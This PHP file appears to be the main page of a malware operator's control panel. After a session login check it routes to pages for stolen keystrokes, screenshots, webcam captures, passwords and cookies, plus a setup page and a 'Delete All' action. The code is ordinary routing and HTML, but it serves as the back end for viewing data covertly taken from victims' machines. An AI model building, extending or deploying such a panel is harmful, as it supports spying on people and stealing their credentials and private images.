<?php
	session_start();
	if (!isset($_SESSION['logged_in']) 
		|| $_SESSION['logged_in'] !== true) {
		header('Location: login.php');
		exit;
	}
	
	$profile_image = "img/user.png";
	
	require_once ("config.php");
	require_once('mysqli.db.php');
	
	$db = new DB($mysql_user,$mysql_password, $mysql_database, $mysql_host);

	$page = '';
	if(isset($_GET['page'])){
		if($_GET['page'] == 'main'){
			$page = 'main';
		}elseif($_GET['page'] == 'passwords'){
			$page = 'passwords';
		}elseif($_GET['page'] == 'cookies'){
			$page = 'cookies';
		}elseif($_GET['page'] == 'keystrokes'){
			$page = 'keystrokes';
		}elseif($_GET['page'] == 'screens'){
			$page = 'screens';
		}elseif($_GET['page'] == 'webcams'){
			$page = 'webcams';
		}elseif($_GET['page'] == 'get-webcam' && isset($_GET['id']) && isset($_GET['title'])){
			$page = 'get-webcam';
		}elseif($_GET['page'] == 'get-log' && isset($_GET['id']) && isset($_GET['title'])){
			$page = 'get-log';
		}elseif($_GET['page'] == 'get-screen' && isset($_GET['id']) && isset($_GET['title'])){
			$page = 'get-screen';
		}elseif($_GET['page'] == 'profile'){
			$page = 'profile';
		}elseif($_GET['page'] == 'setup'){
			$page = 'setup';
		}else{
			$page = 'main';
		}
	}else{
		$page = 'main';
	}
?>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	
    <title>
	<?php 
	if(isset($_GET['page'])){
		if($_GET['page'] == 'main'){
			echo 'Dashboard ';
		}elseif($_GET['page'] == 'passwords'){
			echo 'Passwords ';
		}elseif($_GET['page'] == 'cookies'){
			echo 'Cookies ';
		}elseif($_GET['page'] == 'keystrokes'){
			echo 'Keystrokes ';
		}elseif($_GET['page'] == 'screens'){
			echo 'Screenshots ';
		}elseif($_GET['page'] == 'webcams'){
			echo 'Webcam Captures ';
		}elseif($_GET['page'] == 'get-webcam'){
			echo 'Webcam View ';
		}elseif($_GET['page'] == 'get-log'){
			echo 'Log View ';
		}elseif($_GET['page'] == 'get-screen'){
			echo 'Screenshot View ';
		}elseif($_GET['page'] == 'profile'){
			echo 'Profile ';
		}elseif($_GET['page'] == 'setup'){
			echo 'Setup ';
		}else{
			echo 'Dashboard ';
		}
	}else{
		echo 'Dashboard ';
	}
		
	?>
			
	</title>

    <link href="bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="plugins/bower_components/bootstrap-extension/css/bootstrap-extension.css" rel="stylesheet">
    <link href="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">
    <link href="plugins/bower_components/toast-master/css/jquery.toast.css" rel="stylesheet">
    <link href="plugins/bower_components/morrisjs/morris.css" rel="stylesheet">
	<link href="plugins/bower_components/datatables/jquery.dataTables.min.css" rel="stylesheet" type="text/css" />
    <link href="https://cdn.datatables.net/buttons/1.2.2/css/buttons.dataTables.min.css" rel="stylesheet" type="text/css" />
	<link type="text/css" href="//gyrocode.github.io/jquery-datatables-checkboxes/1.2.11/css/dataTables.checkboxes.css" rel="stylesheet" />

    <link href="css/animate.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
    <link href="css/colors/default.css" id="theme" rel="stylesheet">

	<script src="plugins/bower_components/jquery/dist/jquery.min.js"></script>
	<script src="plugins/bower_components/datatables/jquery.dataTables.min.js"></script>
	 <!--Morris JavaScript -->
    <script src="plugins/bower_components/raphael/raphael-min.js"></script>
    <script src="plugins/bower_components/morrisjs/morris.js"></script>
</head>
<body>
	<!-- Preloader -->
    <div class="preloader">
        <div class="cssload-speeding-wheel"></div>
    </div>
    <div id="wrapper">
		<nav class="navbar navbar-default navbar-static-top m-b-0">
            <div class="navbar-header"> <a class="navbar-toggle hidden-sm hidden-md hidden-lg " href="javascript:void(0)" data-toggle="collapse" data-target=".navbar-collapse"><i class="ti-menu"></i></a>
                <div class="top-left-part"><a class="logo" href="/"><b><!--This is dark logo icon--></b><span class="hidden-xs"><!--This is dark logo text--><img src="img/typo-dark.png" alt="home" class="dark-logo" /><!--This is light logo text--></span></a></div>
                <ul class="nav navbar-top-links navbar-left hidden-xs">
                    <li><a href="javascript:void(0)" class="open-close hidden-xs waves-effect waves-light"><i class="icon-arrow-left-circle ti-menu"></i></a></li>
                </ul>
                <ul class="nav navbar-top-links navbar-right pull-right">

                </ul>
            </div>
        </nav>
		<div class="navbar-default sidebar" role="navigation">
            <div class="sidebar-nav navbar-collapse slimscrollsidebar">
				<div class="user-profile">
                    <div class="dropdown user-pro-body">
                        <div><img alt="image" class="img-circle" img src="img/user.png" /></div>
                        <a href="#" class="dropdown-toggle u-dropdown" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><br> <span><?php echo $username; ?></span> <span class="caret"></span></a>
                        <ul class="dropdown-menu animated flipInY">
                            <li><a href="<?php echo "logout.php"; ?>"><i class="fa fa-power-off"></i>Logout</a></li>
                        </ul>
                    </div>
                </div>
				<ul class="nav" id="side-menu">
					<li>
                        <a href="?page=main" class="waves-effect <?php if($page == 'main'){echo ' active';} ?> "><i class="linea-icon linea-basic fa-lg" data-icon="v"></i> <span class="hide-menu">Dashboard</span></a>
					</li>
					<li>
                        <a href="?page=keystrokes" class="waves-effect <?php if($page == 'keystrokes' || $page == 'get-log'){echo ' active';} ?>"><i class="linea-icon linea-basic fa-lg" data-icon="4"></i> <span class="hide-menu">Keystrokes</span></a>
                    </li>
					<li>
                        <a href="?page=screens" class="waves-effect <?php if($page == 'screens' || $page == 'get-screen'){echo ' active';} ?>"><i class="linea-icon linea-basic fa-lg" data-icon="]"></i> <span class="hide-menu">Screenshots</span></a>
                    </li>
					<li>
                        <a href="?page=webcams" class="waves-effect <?php if($page == 'webcams' || $page == 'get-webcam'){echo 'active';} ?>"><i class="linea-icon linea-basic fa-lg" data-icon="["></i> <span class="hide-menu">Webcam Captures</span></a>
                    </li>
					<li>
                        <a href="?page=passwords" class="waves-effect <?php if($page == 'passwords'){echo 'active';} ?>"><i class="linea-icon linea-basic fa-lg" data-icon="!"></i> <span class="hide-menu">Passwords</span></a>
                    </li>
					<li>
                        <a href="?page=cookies" class="waves-effect <?php if($page == 'cookies'){echo 'active';} ?>"><i class="linea-icon linea-basic fa-lg" data-icon="!"></i> <span class="hide-menu">Cookies</span></a>
                    </li>
					<li>
                        <a href="?page=setup" class="waves-effect <?php if($page == 'setup'){echo 'active';} ?>"><i class="linea-icon linea-basic fa-lg" data-icon="P"></i> <span class="hide-menu">Setup</span></a>
                    </li>
					<li>
                        <a href="deleteall.php" class="waves-effect" onclick="return confirm('Delete All');"><i class="linea-icon linea-basic fa-lg" data-icon="&#xe01f"></i> <span class="hide-menu">Delete All</span></a>
                    </li>
					<li>
						<a href="logout.php" class="waves-effect"><i class="icon-logout fa-fw"></i> <span class="hide-menu">Log out</span></a>
					</li>
				</ul>
			</div>
		</div>
		
		<?php
			if($page == 'main'){
				require('pages/main.php');
			}elseif($page == 'passwords'){
				require('pages/passwords.php');
			}elseif($page == 'cookies'){
				require('pages/cookies.php');
			}elseif($page == 'keystrokes'){
				require('pages/keystrokes.php');
			}elseif($page == 'screens'){
				require('pages/screenshots.php');
			}elseif($page == 'webcams'){
				require('pages/webcams.php');
			}elseif($page == 'get-webcam'){
				require('pages/get-webcams.php');
			}elseif($page == 'get-log'){
				require('pages/get-log.php');
			}elseif($page == 'get-screen'){
				require('pages/get-screens.php');
			}elseif($page == 'profile'){
				require('pages/profile.php');
			}elseif($page == 'setup'){
				require('pages/setup.php');
			}else{
				$page = 'main';
			}
		?>
		
		
	</div>
</div>
	
	
    <!-- Bootstrap Core JavaScript -->
    <script src="bootstrap/dist/js/tether.min.js"></script>
    <script src="bootstrap/dist/js/bootstrap.min.js"></script>
    <script src="plugins/bower_components/bootstrap-extension/js/bootstrap-extension.min.js"></script>
    <!-- Menu Plugin JavaScript -->
    <script src="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>
    <!--slimscroll JavaScript -->
    <script src="js/jquery.slimscroll.js"></script>
    <!--Wave Effects -->
    <script src="js/waves.js"></script>
    <!--Counter js -->
    <script src="plugins/bower_components/waypoints/lib/jquery.waypoints.js"></script>
    <script src="plugins/bower_components/counterup/jquery.counterup.min.js"></script>
   
    <!-- Custom Theme JavaScript -->
    <script src="js/custom.min.js"></script>
	<script>$(".counter").counterUp({
        delay: 100,
        time: 1200
    });</script>
    <!-- Sparkline chart JavaScript -->
    <script src="plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js"></script>
    <script src="plugins/bower_components/jquery-sparkline/jquery.charts-sparkline.js"></script>
    <!--Style Switcher -->
    <script src="plugins/bower_components/styleswitcher/jQuery.style.switcher.js"></script>
	
	<!-- start - This is for export functionality only -->
    <script src="https://cdn.datatables.net/buttons/1.2.2/js/dataTables.buttons.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.2.2/js/buttons.flash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/2.5.0/jszip.min.js"></script>
    <script src="https://cdn.rawgit.com/bpampuch/pdfmake/0.1.18/build/pdfmake.min.js"></script>
    <script src="https://cdn.rawgit.com/bpampuch/pdfmake/0.1.18/build/vfs_fonts.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.2.2/js/buttons.html5.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/1.2.2/js/buttons.print.min.js"></script>
	<script type="text/javascript" src="//gyrocode.github.io/jquery-datatables-checkboxes/1.2.11/js/dataTables.checkboxes.min.js"></script>
	 <script src="plugins/bower_components/datatables-plugins/pagination/input.js"></script>
	<script src="js/download.js"></script>
    <!-- end - This is for export functionality only -->

	
</body>
</html>